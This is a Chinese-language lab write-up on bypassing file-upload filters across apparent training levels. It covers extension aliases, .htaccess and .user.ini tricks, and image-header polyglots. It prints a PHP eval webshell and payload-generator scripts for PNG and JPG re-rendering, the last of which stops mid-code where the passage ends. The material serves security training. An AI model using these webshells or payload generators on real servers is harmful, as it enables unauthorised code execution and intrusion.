<h2 id="对content的过滤"><a href="#对content的过滤" class="headerlink" title="对content的过滤"></a>对content的过滤</h2><p>**&lt;?&#x3D; ?&gt;<strong>与</strong>&lt;?php ?&gt;<strong>与</strong>&lt;script language&#x3D;”php”&gt; &lt;&#x2F;script&gt;**都可以标识php代码。</p>
<p>当文件内容中不能出现&lt;?，&lt;script language&#x3D;”php”&gt;也不能起作用，那么还可以将content进行base64编码，然后借助.htaccess文件解码并解析content。如下：</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .jt</span><br><span class="line">php_value auto_append_file <span class="string">&quot;php://filter/convert.base64-decode/resource=./1.jt</span></span><br></pre></td></tr></table></figure>

<p>PASS-1</p>
<p><strong>只有前端验证，所以我们先选择<code>.jpg</code>后缀的文件，绕过前端验证，再<code>bp</code>抓包修改后缀便可绕过检查。</strong></p>
<p>选择文件<code>exp.jpg</code>其内容如下，<code>bp</code>抓包修改后缀为<code>.php</code>发送，上传成功</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89A   <span class="comment">#这里这个不影响</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;shell&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>F12</code>在查看器中找到上传文件的相对路径</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131915581.png" alt="image-20241015152329058" style="zoom:50%;" />

<p>在蚁剑中连接成功</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131915884.png" alt="image-20241015152616491" style="zoom:50%;" />

<h2 id="MIME验证"><a href="#MIME验证" class="headerlink" title="MIME验证"></a><code>MIME</code>验证</h2><p><strong>添加了<code>MIME</code>信息验证，一般将<code>Content-Type</code>选项修改成<code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code>这三个中的一个即可。</strong></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131915412.png" alt="image-20241015154351022"></p>
<h2 id="别名替换"><a href="#别名替换" class="headerlink" title="别名替换"></a>别名替换</h2><p><strong>添加了黑名单过滤，不允许上传 <code>.asp .aspx .php .jsp</code>后缀文件，可以通过别名绕过。</strong></p>
<p><code>asp aspx jsp php</code>的别名：</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">asa cer cdx</span><br><span class="line">ashx asmx ascx</span><br><span class="line">jspx jspf</span><br><span class="line">php2 php3 php4 php5 phps phtml     Apache服务器可以替换</span><br></pre></td></tr></table></figure>

<h4 id="wp"><a href="#wp" class="headerlink" title="wp"></a><code>wp</code></h4><p><code>bp</code>抓包，添加别名爆破</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131915351.png" alt="image-20241015163720337" style="zoom:50%;" />

<p>根据<code>Response</code>状态，确定可用别名，成功上传</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131915697.png" alt="image-20241015163919606" style="zoom:50%;" />

<p>在<code>Response</code>中寻找返回的相对路径</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131915703.png" alt="image-20241015164714757" style="zoom:50%;" />

<h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a><code>.htaccess</code></h2><p><strong>查看源码，发现黑名单过滤了几乎所有可用后缀，此时就要用到<code>.htaccess</code>了，注意<code>.htaccess</code>是一个文件。</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>​	<code>.htaccess</code>是<code>Apache</code>服务中的一个配置文件，它负责相关目录下的网页配置。通过<code>.htaccess</code>文件，可以帮助实现：网页<code>301</code>重定向，自定义<code>404</code>错误页面，改变文件拓展名，允许&#x2F;阻止特定用户或者目录的访问，配置默认文档等。</p>
<p>​	常用的<code>.htaccess</code>文件格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;exp.jpg&quot;&gt;</span><br><span class="line">	SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>​	<code>SetHandler application/x-httpd-php</code>的意思是设置当前目录的所有文件都使用<code>php</code>解析，那么无论上传什么文件，只要符合<code>php</code>语言代码规范，就会被当作<code>php</code>执行。</p>
<p>这一关我本地环境有问题，是在<a href="http://175.178.67.176:8084/">这里</a>通关的。</p>
<h2 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a><code>.user.ini</code></h2><p>引发<code>.user.ini</code>解析漏洞需要以下三个条件：</p>
<ul>
<li>服务器脚本语言为<code>php</code></li>
<li>服务器使用<code>CGI/FastCGI</code>模式</li>
<li>上传目录下有可执行的<code>php</code>文件</li>
</ul>
<p><code>.user.ini</code>利用：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">auto_prepend_file = exp.jpg</span><br></pre></td></tr></table></figure>

<p>上传该<code>.user.ini</code>文件，再上传<code>exp.jpg</code>文件</p>
<h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><p>源码中没有<code>strtolower()</code>可以利用大小写绕过，<code>strtolower()</code>函数将大写字母转为小写字母。</p>
<h2 id="Pass-0708"><a href="#Pass-0708" class="headerlink" title="Pass-0708"></a><code>Pass-0708</code></h2><p>源码中没有<code>trim()</code>可以空格绕过，没有<code>deldot()</code>可以后缀加点绕过。</p>
<ul>
<li><code>trim()</code>函数会去除字符串中的空格</li>
<li><code>deldot()</code>函数会删除文件名末尾的点</li>
</ul>
<p><strong>注意必须在<code>windows</code>环境下，<code>php</code>版本需为<code>5.3</code>版本，<code>7.3</code>版本不行。</strong></p>
<p>​	如果源码中<code>deldot(),trim()</code>依次存在用来过滤时，如下图，可以使用<code>.php. .</code>的方式绕过，经过两次过滤后剩下的为<code>.php.</code>依然可以绕过黑名单。（在<code>Pass-10</code>中利用此方法通关）</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131914526.png" alt="image-20241015225415994" style="zoom:50%;" />

<p>反正就是分析源码，找到绕过方式，如果使用了两次<code>trim()</code>可能要多加一个空格。</p>
<h2 id="DATA"><a href="#DATA" class="headerlink" title="::$DATA"></a><code>::$DATA</code></h2><p>​	在<code>Windows</code>环境下，上传的文件后缀为<code>.php::$DATA</code>时，服务器上会生成一个后缀为<code>.php</code>的文件，其内容与后缀为<code>.php::$DATA</code>的文件的内容一样。</p>
<h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><p>&#x3D;&#x3D;Pass-11&#x3D;&#x3D;</p>
<p>​	<code>bp</code>改后缀为<code>.pphphp</code>，过滤掉第一个<code>php</code>后，成功上传的文件后缀还是<code>.php</code>；如果改成<code>.phphpp</code>，过滤掉第一个<code>php</code>后，剩下的是<code>.hpp</code>，不可；如果是<code>.phpphp</code>这样，不是双写，不可。</p>
<h2 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h2><p>​	第<code>14</code>关的检查方式是，通过获取上传文件的内容的前两个字节来判断该文件的类型，也就是通过识别文件头判断文件类型。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131914749.png" alt="image-20241017191720004" style="zoom:50%;" />

<p>​	第<code>15</code>关则是通过获取<code>getimagesize()</code>函数的返回结果来检查文件类型，<code>getimagesize()</code>函数的返回结果中包含文件大小和文件类型。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131914785.png" alt="image-20241017191843665" style="zoom:50%;" />

<p>第<code>16</code>关是通过<code>exif_imagetype()</code>函数来识别文件头。</p>
<p>上面三种检查方法其实都差不多，都可以利用下面两种绕过方法绕过：</p>
<h4 id="添加文件头"><a href="#添加文件头" class="headerlink" title="添加文件头"></a>添加文件头</h4><p>在文件的首行添加<code>GIF89a</code>表示为<code>gif</code>文件，添加<code>PNG</code>文件头表示为<code>png</code>文件</p>
<h4 id="使用copy命令"><a href="#使用copy命令" class="headerlink" title="使用copy命令"></a>使用<code>copy</code>命令</h4><p>在<code>cmd</code>中，执行<code>copy zyt.jpg + exp.php zyt.jpg</code>命令</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131914014.png" alt="image-20241017190732155" style="zoom:50%;" />

<p><strong>通关步骤：</strong></p>
<p>先上传下面文件</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131914396.png" alt="image-20241017191047498" style="zoom:50%;" />

<p>获取文件路径后配合文件包含漏洞解析脚本</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131914040.png" alt="image-20241017191238563" style="zoom:50%;" />

<p>向<code>file</code>传参获取<code>webshell</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131914091.png" alt="image-20241017191428286" style="zoom:50%;" />

<h2 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h2><p>&#x3D;&#x3D;Pass-17&#x3D;&#x3D;</p>
<p>本关会先检查文件类型，必须要是不被损坏<code>gif,png,jpg</code>文件，才能上传成功。<br>并且<code>imagecreatefromjpeg()</code>函数会对上传的文件进行二次渲染，保留下来的文件是二次渲染后的文件。<br>最后还要配合文件包含漏洞，解析脚本。</p>
<h4 id="gif"><a href="#gif" class="headerlink" title="gif"></a><code>gif</code></h4><p>直接比较渲染前后的两个文件，找到数据没有发生变化的部分，在渲染前文件中的该部分插入<code>webshell</code>即可。</p>
<p><strong>通关步骤：</strong></p>
<p>上传<code>1.gif</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131914203.png" alt="image-20241017212528750" style="zoom:50%;" />

<p>将<code>1.gif</code>与二次渲染后的文件<code>31494.gif</code>比较，找到未变化部分，插入<code>webshell</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131914601.png" alt="image-20241017212812152" style="zoom:50%;" />

<p>上传修改后的<code>1.gif</code>，得到二次渲染后的文件<code>32588.gif</code>，现在这个文件中的<code>webshell</code>没有再被修改了</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131914819.png" alt="image-20241017212952403" style="zoom:50%;" />

<p>配合文件包含漏洞成功解析脚本</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131913540.png" alt="image-20241017213048163" style="zoom:50%;" />

<h4 id="png"><a href="#png" class="headerlink" title="png"></a><code>png</code></h4><p><code>ALT+4</code>查看模板运行结果</p>
<p><strong>脚本：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">    <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">    <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">    <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">    <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">    <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">    <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">    <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">    <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">    <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>0</code>传函数名，<code>1</code>传参数。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131913292.png" alt="image-20241018210855348" style="zoom:50%;" />

<h4 id="jpg"><a href="#jpg" class="headerlink" title="jpg"></a><code>jpg</code></h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                            <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ 